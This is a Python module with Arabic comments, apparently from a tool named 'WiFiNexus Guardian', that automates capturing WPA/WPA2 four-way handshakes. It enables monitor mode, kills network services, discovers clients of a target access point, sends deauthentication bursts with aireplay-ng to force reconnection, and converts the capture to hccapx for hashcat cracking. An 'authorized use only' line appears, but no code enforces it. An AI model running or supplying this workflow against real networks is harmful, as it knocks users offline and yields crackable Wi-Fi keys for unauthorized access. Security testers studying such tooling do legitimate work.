"""
وحدة التقاط المصافحة - Handshake Capturer Module
تلتقط مصافحة WPA/WPA2 من الشبكات اللاسلكية
للاستخدام القانوني فقط: اختبار الأمان المصرح به ومراجعة الشبكات
"""

import subprocess
import os
import re
import time
import platform
import threading
from datetime import datetime
from typing import Dict, List, Optional
from pathlib import Path


class HandshakeCapturer:
    """
    محترف التقاط مصافحة WPA/WPA2
    يلتقط مصافحة الرباعي (4-way handshake) من الشبكات المستهدفة
    للاستخدام القانوني والأمني المصرح به فقط
    """
    
    def __init__(self, interface: str = None):
        self.platform = platform.system()
        self.interface = interface or self._detect_interface()
        self.original_interface = self.interface
        self.monitor_interface = None
        self.capture_process = None
        self.deauth_process = None
        self.capture_file = None
        self.handshake_detected = False
        self.target_bssid = None
        self.target_channel = None
        self.clients = []
        self.running = False
        self.capture_dir = Path("captures")
        self.capture_dir.mkdir(exist_ok=True)
        
        # الأدوات المطلوبة
        self.required_tools = {
            'Linux': ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'tcpdump'],
            'Windows': ['npcap', 'tshark'],
            'Darwin': ['airport', 'tcpdump']
        }
        
    def _detect_interface(self) -> str:
        """اكتشاف واجهة الشبكة اللاسلكية المتاحة"""
        if self.platform == "Linux":
            interfaces = self._get_linux_interfaces()
            return interfaces[0] if interfaces else "wlan0"
        elif self.platform == "Windows":
            return self._get_windows_interface()
        elif self.platform == "Darwin":
            return "en0"
        return "wlan0"
    
    def _get_linux_interfaces(self) -> List[str]:
        """الحصول على قائمة واجهات الشبكة اللاسلكية في لينكس"""
        try:
            result = subprocess.run(
                ["iwconfig"],
                capture_output=True,
                text=True,
                timeout=10
            )
            interfaces = []
            for line in result.stdout.split('\n'):
                if not line.startswith(' ') and ':' in line:
                    iface = line.split(':')[0]
                    if 'IEEE' in line or 'Wireless' in line:
                        interfaces.append(iface)
            return interfaces if interfaces else ["wlan0", "wlan1"]
        except:
            return ["wlan0"]
    
    def _get_windows_interface(self) -> str:
        """الحصول على اسم واجهة الشبكة اللاسلكية في ويندوز"""
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"],
                capture_output=True,
                text=True,
                timeout=10,
                encoding='utf-8',
                errors='ignore'
            )
            for line in result.stdout.split('\n'):
                if "Name" in line and ":" in line:
                    return line.split(':', 1)[1].strip()
        except:
            pass
        return "Wi-Fi"
    
    def check_requirements(self) -> Dict[str, bool]:
        """التحقق من تثبيت الأدوات المطلوبة"""
        results = {}
        tools = self.required_tools.get(self.platform, [])
        
        for tool in tools:
            try:
                if self.platform == "Windows":
                    result = subprocess.run(
                        ["where", tool],
                        capture_output=True,
                        timeout=5
                    )
                else:
                    result = subprocess.run(
                        ["which", tool],
                        capture_output=True,
                        timeout=5
                    )
                results[tool] = result.returncode == 0
            except:
                results[tool] = False
                
        return results
    
    def enable_monitor_mode(self) -> bool:
        """تفعيل وضع المراقبة على واجهة الشبكة اللاسلكية"""
        if self.platform != "Linux":
            print(f"وضع المراقبة مدعوم بالكامل فقط على لينكس")
            print(f"على {self.platform}, يتم استخدام وضع التحليل الهجين")
            return False
        
        try:
            # إيقاف العمليات المتداخلة
            self._kill_interfering_processes()
            
            # تفعيل وضع المراقبة باستخدام airmon-ng
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", self.interface],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                output = result.stdout
                match = re.search(r'monitor.*?enabled on (\w+)', output, re.IGNORECASE)
                if match:
                    self.monitor_interface = match.group(1)
                else:
                    self.monitor_interface = f"{self.interface}mon"
                
                print(f"✓ تم تفعيل وضع المراقبة على {self.monitor_interface}")
                return True
            else:
                return self._enable_monitor_manual()
                
        except Exception as e:
            print(f"خطأ في تفعيل وضع المراقبة: {e}")
            return False
    
    def _enable_monitor_manual(self) -> bool:
        """طريقة يدوية لتفعيل وضع المراقبة"""
        try:
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"], 
                          capture_output=True, timeout=10)
            subprocess.run(["sudo", "iw", self.interface, "set", "monitor", "control"],
                          capture_output=True, timeout=10)
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"],
                          capture_output=True, timeout=10)
            
            self.monitor_interface = self.interface
            print(f"✓ تم تفعيل وضع المراقبة (يدوي) على {self.monitor_interface}")
            return True
            
        except Exception as e:
            print(f"فشل الوضع اليدوي: {e}")
            return False
    
    def disable_monitor_mode(self) -> bool:
        """تعطيل وضع المراقبة واستعادة الوضع الطبيعي"""
        if self.platform != "Linux" or not self.monitor_interface:
            return False
        
        try:
            subprocess.run(
                ["sudo", "airmon-ng", "stop", self.monitor_interface],
                capture_output=True,
                text=True,
                timeout=30
            )
            print(f"✓ تم تعطيل وضع المراقبة")
            self.monitor_interface = None
            return True
        except:
            try:
                subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"],
                              capture_output=True, timeout=10)
                subprocess.run(["sudo", "iw", self.interface, "set", "type", "managed"],
                              capture_output=True, timeout=10)
                subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"],
                              capture_output=True, timeout=10)
                print(f"✓ تم تعطيل وضع المراقبة (يدوي)")
                return True
            except:
                return False
    
    def _kill_interfering_processes(self):
        """إيقاف العمليات التي تتداخل مع وضع المراقبة"""
        processes = ['NetworkManager', 'wpa_supplicant', 'dhclient']
        for proc in processes:
            try:
                subprocess.run(
                    ["sudo", "killall", proc],
                    capture_output=True,
                    timeout=5
                )
            except:
                pass
    
    def start_capture(self, target_bssid: str = None, channel: int = None, 
                     duration: int = 60) -> str:
        """
        بدء التقاط الحزم لاكتشاف المصافحة
        
        Args:
            target_bssid: BSSID الشبكة المستهدفة (اختياري)
            channel: القناة للمراقبة (اختياري)
            duration: مدة الالتقاط بالثواني
        
        Returns:
            مسار ملف الالتقاط
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.capture_file = str(self.capture_dir / f"capture_{timestamp}.pcap")
        self.target_bssid = target_bssid
        self.target_channel = channel
        self.handshake_detected = False
        self.running = True
        
        if self.platform == "Linux":
            return self._start_capture_linux(duration)
        elif self.platform == "Windows":
            return self._start_capture_windows(duration)
        elif self.platform == "Darwin":
            return self._start_capture_macos(duration)
    
    def _start_capture_linux(self, duration: int) -> str:
        """بدء الالتقاط على لينكس باستخدام airodump-ng"""
        interface = self.monitor_interface or self.interface
        
        try:
            cmd = [
                "sudo", "airodump-ng",
                "-w", self.capture_file.replace('.pcap', ''),
                "--output-format", "pcap"
            ]
            
            if self.target_bssid:
                cmd.extend(["--bssid", self.target_bssid])
            
            if self.target_channel:
                cmd.extend(["-c", str(self.target_channel)])
            
            cmd.append(interface)
            
            print(f"بدء الالتقاط على {interface}...")
            print(f"ملف الالتقاط: {self.capture_file}")
            
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # مراقبة المصافحة في الخلفية
            threading.Thread(target=self._monitor_handshake, daemon=True).start()
            
            def stop_after_duration():
                time.sleep(duration)
                if self.running:
                    self.stop_capture()
            
            threading.Thread(target=stop_after_duration, daemon=True).start()
            
            return self.capture_file
            
        except Exception as e:
            print(f"خطأ في الالتقاط: {e}")
            return None
    
    def _start_capture_windows(self, duration: int) -> str:
        """بدء الالتقاط على ويندوز باستخدام tshark/Npcap"""
        try:
            result = subprocess.run(
                ["tshark", "-D"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            interface_num = "1"
            for line in result.stdout.split('\n'):
                if "Wireless" in line or "Wi-Fi" in line:
                    interface_num = line.split('.')[0].strip()
                    break
            
            cmd = [
                "tshark",
                "-i", interface_num,
                "-w", self.capture_file,
                "-f", "port 80 or port 443 or type mgt",
                "-a", f"duration:{duration}"
            ]
            
            print(f"بدء الالتقاط على ويندوز...")
            print(f"ملف الالتقاط: {self.capture_file}")
            
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            threading.Thread(target=self._monitor_handshake_windows, daemon=True).start()
            
            return self.capture_file
            
        except Exception as e:
            print(f"خطأ في الالتقاط على ويندوز: {e}")
            return None
    
    def _start_capture_macos(self, duration: int) -> str:
        """بدء الالتقاط على ماك"""
        try:
            cmd = [
                "sudo", "tcpdump",
                "-i", self.interface,
                "-w", self.capture_file,
                "type mgt or port 80 or port 443"
            ]
            
            print(f"بدء الالتقاط على ماك...")
            
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            def stop_after_duration():
                time.sleep(duration)
                self.stop_capture()
            
            threading.Thread(target=stop_after_duration, daemon=True).start()
            
            return self.capture_file
            
        except Exception as e:
            print(f"خطأ في الالتقاط على ماك: {e}")
            return None
    
    def _monitor_handshake(self):
        """مراقبة ملف الالتقاط لاكتشاف المصافحة"""
        check_interval = 5
        elapsed = 0
        
        while self.running and elapsed < 300:
            time.sleep(check_interval)
            elapsed += check_interval
            
            if os.path.exists(self.capture_file):
                if self._check_handshake_in_file(self.capture_file):
                    print(f"\n✓✓✓ تم اكتشاف المصافحة! ✓✓✓")
                    print(f"محفوظة في: {self.capture_file}")
                    self.handshake_detected = True
                    
                    self._convert_to_hccapx()
                    self._log_handshake_capture()
                    
                    return
    
    def _monitor_handshake_windows(self):
        """مراقبة المصافحة على ويندوز"""
        time.sleep(10)
        if os.path.exists(self.capture_file):
            print(f"\nالالتقاط اكتمل. جاري تحليل المصافحة...")
            self._analyze_pcap_for_handshake()
    
    def _check_handshake_in_file(self, filepath: str) -> bool:
        """التحقق مما إذا كان ملف pcap يحتوي على مصافحة صحيحة"""
        try:
            result = subprocess.run(
                ["tshark", "-r", filepath, "-Y", "eapol", "-T", "fields", "-e", "frame.number"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0 and result.stdout.strip():
                eapol_count = len(result.stdout.strip().split('\n'))
                if eapol_count >= 4:
                    return True
                    
            result = subprocess.run(
                ["aircrack-ng", filepath],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                if "KEY FOUND" in result.stdout or "handshake" in result.stdout.lower():
                    return True
                    
            return False
            
        except:
            return False
    
    def _analyze_pcap_for_handshake(self):
        """تحليل ملف pcap للبحث عن المصافحة"""
        if not os.path.exists(self.capture_file):
            return
        
        try:
            result = subprocess.run(
                ["tshark", "-r", self.capture_file, "-Y", "eapol", "-q", "-z", "eapol,stat"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.stdout:
                print(f"حزم EAPOL المكتشفة: {result.stdout.count('EAPOL')}")
            
            result = subprocess.run(
                ["aircrack-ng", self.capture_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if "handshake" in result.stdout.lower():
                print(f"✓ تم اكتشاف المصافحة في الالتقاط!")
                self.handshake_detected = True
                self._convert_to_hccapx()
                
        except Exception as e:
            print(f"خطأ في التحليل: {e}")
    
    def send_deauth(self, target_bssid: str, client_mac: str = None, 
                   count: int = 10) -> bool:
        """
        إرسال حزم إلغاء المصادقة لإجبار إعادة الاتصال
        
        Args:
            target_bssid: MAC نقطة الوصول المستهدفة
            client_mac: MAC العميل لإلغاء المصادقة
            count: عدد حزم deauth للإرسال
        """
        if self.platform != "Linux":
            print(f"إلغاء المصادقة مدعوم فقط على لينكس")
            return False
        
        interface = self.monitor_interface or self.interface
        
        try:
            cmd = [
                "sudo", "aireplay-ng",
                "--deauth", str(count),
                "-a", target_bssid
            ]
            
            if client_mac:
                cmd.extend(["-c", client_mac])
            
            cmd.append(interface)
            
            print(f"إرسال {count} حزم deauth إلى {target_bssid}...")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                print(f"✓ تم إرسال حزم Deauth بنجاح")
                return True
            else:
                print(f"فشل Deauth: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"خطأ في Deauth: {e}")
            return False
    
    def discover_clients(self, target_bssid: str, duration: int = 30) -> List[str]:
        """
        اكتشاف العملاء المتصلين بالشبكة المستهدفة
        
        Args:
            target_bssid: عنوان MAC لنقطة الوصول
            duration: مدة الاكتشاف بالثواني
        
        Returns:
            قائمة بعناوين MAC للعملاء
        """
        self.clients = []
        interface = self.monitor_interface or self.interface
        
        try:
            cmd = [
                "sudo", "airodump-ng",
                "--bssid", target_bssid,
                "--write", "/tmp/client_scan",
                "--output-format", "csv",
                interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(duration)
            process.terminate()
            
            csv_file = "/tmp/client_scan-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    lines = f.readlines()
                    for line in lines[1:]:
                        parts = line.split(',')
                        if len(parts) >= 6:
                            mac = parts[0].strip()
                            station_type = parts[1].strip()
                            if station_type != "not associated" and mac != target_bssid:
                                if mac not in self.clients:
                                    self.clients.append(mac)
            
            print(f"تم اكتشاف {len(self.clients)} عميل")
            return self.clients
            
        except Exception as e:
            print(f"خطأ في اكتشاف العملاء: {e}")
            return []
    
    def stop_capture(self):
        """إيقاف الالتقاط الجاري"""
        self.running = False
        
        if self.capture_process:
            try:
                self.capture_process.terminate()
                self.capture_process.wait(timeout=10)
                print(f"تم إيقاف الالتقاط")
            except:
                try:
                    self.capture_process.kill()
                except:
                    pass
            finally:
                self.capture_process = None
        
        if self.deauth_process:
            try:
                self.deauth_process.terminate()
            except:
                pass
    
    def _convert_to_hccapx(self):
        """تحويل pcap إلى صيغة HCCAPX لـ hashcat"""
        if not self.capture_file or not os.path.exists(self.capture_file):
            return
        
        try:
            hccapx_file = self.capture_file.replace('.pcap', '.hccapx')
            
            result = subprocess.run(
                ["cap2hccapx", self.capture_file, hccapx_file],
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0:
                print(f"✓ تم التحويل إلى HCCAPX: {hccapx_file}")
            else:
                result = subprocess.run(
                    ["aircrack-ng", self.capture_file, "-J", hccapx_file.replace('.hccapx', '')],
                    capture_output=True,
                    timeout=30
                )
                
                if result.returncode == 0:
                    print(f"✓ تم التحويل باستخدام aircrack-ng")
                    
        except Exception as e:
            print(f"خطأ في تحويل HCCAPX: {e}")
    
    def _log_handshake_capture(self):
        """تسجيل التقاط المصافحة في ملف/قاعدة بيانات"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "target_bssid": self.target_bssid,
            "capture_file": self.capture_file,
            "platform": self.platform,
            "interface": self.interface
        }
        
        log_file = self.capture_dir / "handshake_log.txt"
        with open(log_file, 'a') as f:
            f.write(f"{log_entry['timestamp']} | BSSID: {log_entry['target_bssid']} | File: {log_entry['capture_file']}\n")
        
        print(f"تم التسجيل في: {log_file}")
    
    def capture_handshake_targeted(self, target_bssid: str, channel: int,
                                   timeout: int = 120) -> Optional[str]:
        """
        سير عمل كامل لالتقاط المصافحة المستهدفة
        
        Args:
            target_bssid: MAC الشبكة المستهدفة
            channel: قناة الشبكة
            timeout: أقصى وقت للانتظار
        
        Returns:
            مسار ملف المصافحة الملتقطة أو None
        """
        print(f"\n{'='*60}")
        print(f"التقاط المصافحة المستهدفة")
        print(f"{'='*60}")
        print(f"BSSID المستهدف: {target_bssid}")
        print(f"القناة: {channel}")
        print(f"المهلة: {timeout}ثانية")
        print(f"{'='*60}\n")
        
        if self.platform == "Linux":
            if not self.enable_monitor_mode():
                print("فشل تفعيل وضع المراقبة")
                return None
        
        capture_file = self.start_capture(
            target_bssid=target_bssid,
            channel=channel,
            duration=timeout
        )
        
        if not capture_file:
            return None
        
        print(f"انتظار العملاء...")
        time.sleep(10)
        
        clients = self.discover_clients(target_bssid, duration=20)
        
        if clients:
            print(f"تم العثور على {len(clients)} عميل")
            for client in clients[:3]:
                print(f"إلغاء مصادقة {client}...")
                self.send_deauth(target_bssid, client_mac=client, count=5)
                time.sleep(5)
                
                if self.handshake_detected:
                    break
        else:
            print("لم يتم العثور على عملاء، انتظار المصافحة الطبيعية...")
        
        print(f"مراقبة المصافحة...")
        wait_time = 0
        while wait_time < timeout and not self.handshake_detected:
            time.sleep(10)
            wait_time += 10
            print(f"المنقضي: {wait_time}ث/{timeout}ث")
        
        self.stop_capture()
        
        if self.platform == "Linux":
            self.disable_monitor_mode()
        
        if self.handshake_detected:
            print(f"\n{'='*60}")
            print(f"نجاح! تم التقاط المصافحة وحفظها")
            print(f"PCAP: {self.capture_file}")
            print(f"{'='*60}\n")
            return self.capture_file
        else:
            print(f"\nلم يتم التقاط المصافحة خلال المهلة")
            return None
    
    def get_capture_status(self) -> Dict:
        """الحصول على حالة الالتقاط الحالية"""
        return {
            "running": self.running,
            "interface": self.interface,
            "monitor_interface": self.monitor_interface,
            "target_bssid": self.target_bssid,
            "capture_file": self.capture_file,
            "handshake_detected": self.handshake_detected,
            "clients_found": len(self.clients),
            "platform": self.platform
        }
    
    def list_captures(self) -> List[Dict]:
        """سرد جميع ملفات المصافحة الملتقطة"""
        captures = []
        
        if not self.capture_dir.exists():
            return captures
        
        for file in self.capture_dir.glob("*.pcap"):
            stat = file.stat()
            captures.append({
                "filename": file.name,
                "path": str(file),
                "size": stat.st_size,
                "created": datetime.fromtimestamp(stat.st_ctime).isoformat(),
                "has_handshake": self._check_handshake_in_file(str(file))
            })
        
        return sorted(captures, key=lambda x: x['created'], reverse=True)


if __name__ == "__main__":
    print("="*60)
    print("WiFiNexus Guardian - اختبار وحدة التقاط المصافحة")
    print("="*60)
    
    capturer = HandshakeCapturer()
    
    print("\nالتحقق من المتطلبات...")
    reqs = capturer.check_requirements()
    for tool, installed in reqs.items():
        status = "✓" if installed else "✗"
        print(f"  {status} {tool}")
    
    print(f"\nحالة الالتقاط:")
    status = capturer.get_capture_status()
    for key, value in status.items():
        print(f"  {key}: {value}")
    
    print(f"\nالالتقاطات الموجودة:")
    captures = capturer.list_captures()
    if captures:
        for cap in captures:
            hs = "✓ يحتوي مصافحة" if cap['has_handshake'] else ""
            print(f"  - {cap['filename']} ({cap['size']} بايت) {hs}")
    else:
        print("  لم يتم العثور على التقاطات")
    
    print("\n" + "="*60)
    print("جاهز لعمليات التقاط المصافحة")
    print("="*60)
